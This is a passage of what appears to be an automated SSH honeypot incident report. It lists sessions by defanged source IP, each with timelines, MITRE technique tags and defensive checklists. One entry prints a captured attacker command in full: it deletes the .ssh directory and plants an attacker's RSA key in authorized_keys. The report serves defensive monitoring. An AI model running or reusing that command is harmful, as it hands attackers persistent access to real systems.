| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:40:16` | `cowrie.session.connect` |
| `2026-08-16 07:40:21` | `cowrie.client.version` |
| `2026-08-16 07:40:21` | `cowrie.client.kex` |
| `2026-08-16 07:40:45` | `cowrie.login.success` |
| `2026-08-16 07:40:57` | `cowrie.session.params` |
| `2026-08-16 07:40:57` | `cowrie.command.input` |
| `2026-08-16 07:41:02` | `cowrie.log.closed` |
| `2026-08-16 07:41:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae96bc9c686f

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]68` |
| **First Seen** | 2026-08-16 07:43 |
| **Last Seen** | 2026-08-16 07:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:43:37` | `cowrie.session.connect` |
| `2026-08-16 07:43:37` | `cowrie.client.version` |
| `2026-08-16 07:43:38` | `cowrie.client.kex` |
| `2026-08-16 07:43:38` | `cowrie.login.success` |
| `2026-08-16 07:43:39` | `cowrie.session.params` |
| `2026-08-16 07:43:39` | `cowrie.command.input` |
| `2026-08-16 07:43:39` | `cowrie.command.failed` |
| `2026-08-16 07:43:39` | `cowrie.log.closed` |
| `2026-08-16 07:43:40` | `cowrie.session.params` |
| `2026-08-16 07:43:40` | `cowrie.command.input` |
| `2026-08-16 07:43:40` | `cowrie.session.file_download` |
| `2026-08-16 07:43:40` | `cowrie.log.closed` |
| `2026-08-16 07:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]68` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a0d1dfc233b

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]68` |
| **First Seen** | 2026-08-16 07:43 |
| **Last Seen** | 2026-08-16 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:43:40` | `cowrie.session.connect` |
| `2026-08-16 07:43:40` | `cowrie.client.version` |
| `2026-08-16 07:43:40` | `cowrie.client.kex` |
| `2026-08-16 07:43:40` | `cowrie.login.success` |
| `2026-08-16 07:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]68` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75a8f42eeb1d

| Field | Detail |
|---|---|
| **Source IP** | `171.25.158[.]68` |
| **First Seen** | 2026-08-16 07:43 |
| **Last Seen** | 2026-08-16 07:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:43:41` | `cowrie.session.connect` |
| `2026-08-16 07:43:41` | `cowrie.client.version` |
| `2026-08-16 07:43:41` | `cowrie.client.kex` |
| `2026-08-16 07:43:41` | `cowrie.login.success` |
| `2026-08-16 07:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.25.158[.]68` to AbuseIPDB if not already reported
- [ ] Block `171.25.158[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f286fbcf9a6

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-16 07:45 |
| **Last Seen** | 2026-08-16 07:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:45:07` | `cowrie.session.connect` |
| `2026-08-16 07:45:07` | `cowrie.client.version` |
| `2026-08-16 07:45:07` | `cowrie.client.kex` |
| `2026-08-16 07:45:08` | `cowrie.login.success` |
| `2026-08-16 07:45:08` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:45:08` | `cowrie.direct-tcpip.data` |
| `2026-08-16 07:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfeab9592ad

| Field | Detail |
|---|---|
| **Source IP** | `213.55.79[.]195` |
| **First Seen** | 2026-08-16 07:49 |
| **Last Seen** | 2026-08-16 07:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:49:34` | `cowrie.session.connect` |
| `2026-08-16 07:49:35` | `cowrie.client.version` |
| `2026-08-16 07:49:35` | `cowrie.client.kex` |
| `2026-08-16 07:49:36` | `cowrie.login.success` |
| `2026-08-16 07:49:37` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:49:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.55.79[.]195` to AbuseIPDB if not already reported
- [ ] Block `213.55.79[.]195` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eebc55418387

| Field | Detail |
|---|---|
| **Source IP** | `103.158.138[.]179` |
| **First Seen** | 2026-08-16 07:49 |
| **Last Seen** | 2026-08-16 07:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:49:42` | `cowrie.session.connect` |
| `2026-08-16 07:49:43` | `cowrie.client.version` |
| `2026-08-16 07:49:43` | `cowrie.client.kex` |
| `2026-08-16 07:49:45` | `cowrie.login.success` |
| `2026-08-16 07:49:46` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:49:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.138[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.158.138[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faddc11b8040

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-08-16 07:51 |
| **Last Seen** | 2026-08-16 07:52 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:51:53` | `cowrie.session.connect` |
| `2026-08-16 07:51:54` | `cowrie.client.version` |
| `2026-08-16 07:51:54` | `cowrie.client.kex` |
| `2026-08-16 07:51:55` | `cowrie.login.success` |
| `2026-08-16 07:51:56` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:52:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5269d66775aa

| Field | Detail |
|---|---|
| **Source IP** | `117.247.77[.]115` |
| **First Seen** | 2026-08-16 07:52 |
| **Last Seen** | 2026-08-16 07:52 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:52:01` | `cowrie.session.connect` |
| `2026-08-16 07:52:02` | `cowrie.client.version` |
| `2026-08-16 07:52:02` | `cowrie.client.kex` |
| `2026-08-16 07:52:04` | `cowrie.login.success` |
| `2026-08-16 07:52:05` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.247.77[.]115` to AbuseIPDB if not already reported
- [ ] Block `117.247.77[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64776406e9ca

| Field | Detail |
|---|---|
| **Source IP** | `222.120.176[.]6` |
| **First Seen** | 2026-08-16 07:54 |
| **Last Seen** | 2026-08-16 07:54 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:54:41` | `cowrie.session.connect` |
| `2026-08-16 07:54:42` | `cowrie.client.version` |
| `2026-08-16 07:54:42` | `cowrie.client.kex` |
| `2026-08-16 07:54:45` | `cowrie.login.success` |
| `2026-08-16 07:54:46` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:54:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `222.120.176[.]6` to AbuseIPDB if not already reported
- [ ] Block `222.120.176[.]6` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69825ed32a35

| Field | Detail |
|---|---|
| **Source IP** | `210.0.90[.]81` |
| **First Seen** | 2026-08-16 07:54 |
| **Last Seen** | 2026-08-16 07:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:54:52` | `cowrie.session.connect` |
| `2026-08-16 07:54:53` | `cowrie.client.version` |
| `2026-08-16 07:54:53` | `cowrie.client.kex` |
| `2026-08-16 07:54:56` | `cowrie.login.success` |
| `2026-08-16 07:54:57` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:55:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.0.90[.]81` to AbuseIPDB if not already reported
- [ ] Block `210.0.90[.]81` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-99cca121374c

| Field | Detail |
|---|---|
| **Source IP** | `211.22.222[.]251` |
| **First Seen** | 2026-08-16 07:57 |
| **Last Seen** | 2026-08-16 07:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:57:12` | `cowrie.session.connect` |
| `2026-08-16 07:57:13` | `cowrie.client.version` |
| `2026-08-16 07:57:13` | `cowrie.client.kex` |
| `2026-08-16 07:57:15` | `cowrie.login.success` |
| `2026-08-16 07:57:16` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.22.222[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.22.222[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6956168291b

| Field | Detail |
|---|---|
| **Source IP** | `179.185.1[.]97` |
| **First Seen** | 2026-08-16 07:57 |
| **Last Seen** | 2026-08-16 07:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:57:22` | `cowrie.session.connect` |
| `2026-08-16 07:57:23` | `cowrie.client.version` |
| `2026-08-16 07:57:23` | `cowrie.client.kex` |
| `2026-08-16 07:57:24` | `cowrie.login.success` |
| `2026-08-16 07:57:25` | `cowrie.direct-tcpip.request` |
| `2026-08-16 07:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.185.1[.]97` to AbuseIPDB if not already reported
- [ ] Block `179.185.1[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-677cd1dd5940

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 07:58 |
| **Last Seen** | 2026-08-16 07:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 07:58:59` | `cowrie.session.connect` |
| `2026-08-16 07:58:59` | `cowrie.client.version` |
| `2026-08-16 07:59:00` | `cowrie.client.kex` |
| `2026-08-16 07:59:00` | `cowrie.login.success` |
| `2026-08-16 07:59:01` | `cowrie.session.params` |
| `2026-08-16 07:59:01` | `cowrie.command.input` |
| `2026-08-16 07:59:01` | `cowrie.log.closed` |
| `2026-08-16 07:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64f17b7b9d3a

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 08:03 |
| **Last Seen** | 2026-08-16 08:03 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:03:07` | `cowrie.session.connect` |
| `2026-08-16 08:03:13` | `cowrie.client.version` |
| `2026-08-16 08:03:13` | `cowrie.client.kex` |
| `2026-08-16 08:03:36` | `cowrie.login.success` |
| `2026-08-16 08:03:48` | `cowrie.session.params` |
| `2026-08-16 08:03:48` | `cowrie.command.input` |
| `2026-08-16 08:03:54` | `cowrie.log.closed` |
| `2026-08-16 08:03:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3db2ea584e1e

| Field | Detail |
|---|---|
| **Source IP** | `217.165.22[.]192` |
| **First Seen** | 2026-08-16 08:18 |
| **Last Seen** | 2026-08-16 08:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:18:07` | `cowrie.session.connect` |
| `2026-08-16 08:18:07` | `cowrie.client.version` |
| `2026-08-16 08:18:07` | `cowrie.client.kex` |
| `2026-08-16 08:18:08` | `cowrie.login.success` |
| `2026-08-16 08:18:09` | `cowrie.session.params` |
| `2026-08-16 08:18:09` | `cowrie.command.input` |
| `2026-08-16 08:18:09` | `cowrie.log.closed` |
| `2026-08-16 08:18:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.165.22[.]192` to AbuseIPDB if not already reported
- [ ] Block `217.165.22[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc9b3c63a885

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]166` |
| **First Seen** | 2026-08-16 08:20 |
| **Last Seen** | 2026-08-16 08:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:20:56` | `cowrie.session.connect` |
| `2026-08-16 08:20:56` | `cowrie.client.version` |
| `2026-08-16 08:20:57` | `cowrie.client.kex` |
| `2026-08-16 08:20:59` | `cowrie.login.success` |
| `2026-08-16 08:20:59` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:21:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]166` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64cfd44d1cc1

| Field | Detail |
|---|---|
| **Source IP** | `211.178.165[.]251` |
| **First Seen** | 2026-08-16 08:23 |
| **Last Seen** | 2026-08-16 08:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:23:24` | `cowrie.session.connect` |
| `2026-08-16 08:23:25` | `cowrie.client.version` |
| `2026-08-16 08:23:25` | `cowrie.client.kex` |
| `2026-08-16 08:23:27` | `cowrie.login.success` |
| `2026-08-16 08:23:28` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:23:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.178.165[.]251` to AbuseIPDB if not already reported
- [ ] Block `211.178.165[.]251` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-895a1e2d84e4

| Field | Detail |
|---|---|
| **Source IP** | `24.207.66[.]154` |
| **First Seen** | 2026-08-16 08:23 |
| **Last Seen** | 2026-08-16 08:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:23:33` | `cowrie.session.connect` |
| `2026-08-16 08:23:33` | `cowrie.client.version` |
| `2026-08-16 08:23:33` | `cowrie.client.kex` |
| `2026-08-16 08:23:35` | `cowrie.login.success` |
| `2026-08-16 08:23:35` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:23:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.207.66[.]154` to AbuseIPDB if not already reported
- [ ] Block `24.207.66[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e9f58347f24

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 08:26 |
| **Last Seen** | 2026-08-16 08:26 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:26:00` | `cowrie.session.connect` |
| `2026-08-16 08:26:06` | `cowrie.client.version` |
| `2026-08-16 08:26:06` | `cowrie.client.kex` |
| `2026-08-16 08:26:29` | `cowrie.login.success` |
| `2026-08-16 08:26:41` | `cowrie.session.params` |
| `2026-08-16 08:26:41` | `cowrie.command.input` |
| `2026-08-16 08:26:46` | `cowrie.log.closed` |
| `2026-08-16 08:26:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae2aff18e597

| Field | Detail |
|---|---|
| **Source IP** | `27.223.98[.]117` |
| **First Seen** | 2026-08-16 08:26 |
| **Last Seen** | 2026-08-16 08:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:26:00` | `cowrie.session.connect` |
| `2026-08-16 08:26:01` | `cowrie.client.version` |
| `2026-08-16 08:26:01` | `cowrie.client.kex` |
| `2026-08-16 08:26:03` | `cowrie.login.success` |
| `2026-08-16 08:26:03` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:26:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.223.98[.]117` to AbuseIPDB if not already reported
- [ ] Block `27.223.98[.]117` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5342ffd4dbf0

| Field | Detail |
|---|---|
| **Source IP** | `36.64.36[.]101` |
| **First Seen** | 2026-08-16 08:28 |
| **Last Seen** | 2026-08-16 08:28 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:28:30` | `cowrie.session.connect` |
| `2026-08-16 08:28:32` | `cowrie.client.version` |
| `2026-08-16 08:28:32` | `cowrie.client.kex` |
| `2026-08-16 08:28:35` | `cowrie.login.success` |
| `2026-08-16 08:28:37` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:28:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.64.36[.]101` to AbuseIPDB if not already reported
- [ ] Block `36.64.36[.]101` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14c6c8cfd9f9

| Field | Detail |
|---|---|
| **Source IP** | `65.20.202[.]4` |
| **First Seen** | 2026-08-16 08:28 |
| **Last Seen** | 2026-08-16 08:29 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:28:54` | `cowrie.session.connect` |
| `2026-08-16 08:28:54` | `cowrie.client.version` |
| `2026-08-16 08:28:54` | `cowrie.client.kex` |
| `2026-08-16 08:28:55` | `cowrie.login.success` |
| `2026-08-16 08:28:56` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:29:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.202[.]4` to AbuseIPDB if not already reported
- [ ] Block `65.20.202[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fae28e1451a

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-16 08:31 |
| **Last Seen** | 2026-08-16 08:31 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:31:05` | `cowrie.session.connect` |
| `2026-08-16 08:31:06` | `cowrie.client.version` |
| `2026-08-16 08:31:06` | `cowrie.client.kex` |
| `2026-08-16 08:31:09` | `cowrie.login.success` |
| `2026-08-16 08:31:10` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:31:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87aee81bc5fc

| Field | Detail |
|---|---|
| **Source IP** | `122.176.45[.]238` |
| **First Seen** | 2026-08-16 08:31 |
| **Last Seen** | 2026-08-16 08:31 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 08:31:14` | `cowrie.session.connect` |
| `2026-08-16 08:31:14` | `cowrie.client.version` |
| `2026-08-16 08:31:14` | `cowrie.client.kex` |
| `2026-08-16 08:31:17` | `cowrie.login.success` |
| `2026-08-16 08:31:17` | `cowrie.direct-tcpip.request` |
| `2026-08-16 08:31:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.45[.]238` to AbuseIPDB if not already reported
- [ ] Block `122.176.45[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4edc720d397

| Field | Detail |
|---|---|
| **Source IP** | `107.135.117[.]245` |
